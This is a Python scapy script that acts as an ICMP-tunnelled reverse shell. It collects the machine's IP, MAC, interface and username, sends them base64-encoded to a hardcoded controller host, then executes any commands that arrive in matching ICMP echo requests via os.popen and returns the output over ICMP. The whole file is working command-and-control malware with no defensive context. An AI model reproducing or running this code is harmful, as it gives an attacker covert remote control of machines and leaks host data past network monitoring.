#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import netifaces
import socket
import psutil
import pwd
import base64

dest = "192.168.157.6"
ICMP_ID = int(12800)
TTL = int(64)

class Host:

    def __init__(self):
        self.ip = self.get_local_ip()
        self.iface = self.get_iface()
        self.mac = self.get_mac()
        self.user = pwd.getpwuid(os.getuid())[0]
        self.heartbeat = 0

    def get_iface(self) -> str:
        nics = psutil.net_if_addrs()
        iface = [i for i in nics for j in nics[i] if j.address==self.ip and j.family==socket.AF_INET][0]
        return iface
        
    def get_local_ip(self) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("192.255.255.255", 1))
            ip = s.getsockname()[0]
        except:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip

    def get_mac(self) -> str:
        nics = psutil.net_if_addrs()
        mac = ([j.address for i in nics for j in nics[i] if i==self.iface and j.family==psutil.AF_LINK])[0]
        return mac.replace('-',':')

    def build_shellpack(self, command: str, message: str | None) -> dict:
        shellpack = {
            "command": command,
            "message": message,
            "ip": self.ip,
            "mac": self.mac,
            "iface": self.iface,
            "user": self.user,
            "heartbeat": self.heartbeat
            }

        return shellpack

    def send(self, shellpack) -> bool:
        encoded_shellpack = str(shellpack).encode('utf-8')
        encoded_shellpack = base64.b64encode(encoded_shellpack)
        
        data = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=encoded_shellpack))
        sr(data, timeout=0, verbose=0)
        
        return True

    def join(self) -> bool:
        shellpack = self.build_shellpack("join", None)
        self.send(shellpack)
        return True


    def __str__(self) -> str:
        report =  f"[ Host Information ]\n"
        report += f" -- IP: {self.ip}\n"
        report += f" -- MAC: {self.mac}\n"
        report += f" -- Interface: {self.iface}\n"

        return report

def rvsh(pkt):
    if pkt[IP].src == dest and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

def setup_host() -> Host:
    print("[ Setting up host... ]")
    host = Host()
    print(host)

    # Send join command
    #join = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load="join"))
    #sr(join, timeout=0, verbose=0)
    host.join()

    return host

if __name__ == "__main__":
    host = setup_host()
    print("[ ICMP Sniffing Started ]")
    sniff(iface=host.iface, prn=rvsh, filter="icmp", store="0")
